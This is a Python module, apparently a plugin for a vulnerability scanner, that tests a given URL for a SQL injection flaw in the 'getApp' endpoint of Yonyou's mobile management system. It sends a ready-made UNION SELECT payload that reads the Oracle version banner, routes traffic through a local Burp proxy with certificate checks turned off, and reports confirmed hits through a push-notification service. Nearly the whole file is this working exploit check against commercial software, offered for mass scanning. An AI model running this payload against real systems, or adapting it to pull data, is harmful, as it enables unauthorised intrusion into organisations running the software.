import ssl
import urllib
import urllib.parse
import urllib.request

import requests

from Modules import ServerJ


class Basic_information:
    no = 128,
    bugName = "用友移动管理系统 getApp SQL注入漏洞"


def scan_Yongyou_getApp_SQL(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/mobsm/common/"
    base_url = url + path
    relative_path = "../appManage/getApp"
    full_url = base_url + relative_path

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
    }

    data = '''pk_dvcmngmnt=0' union select banner,'test+SQLi',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from sys.v_$version where rownum=1--+'''
    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        # 创建不验证SSL证书的HTTPSHandler
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        https_handler = urllib.request.HTTPSHandler(context=context)
        # 设置Burp代理
        proxy_handler = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        # 构建Opener
        opener = urllib.request.build_opener(proxy_handler)
        # 构建请求对象
        request = urllib.request.Request(full_url, data=data.encode('utf-8'), headers=headers)
        # 发送POST请求
        response = opener.open(request)
        result = str(response.read())
        if response.getcode() == 200 and 'Oracle' in result:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except requests.ConnectionError as conn_err:
        append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
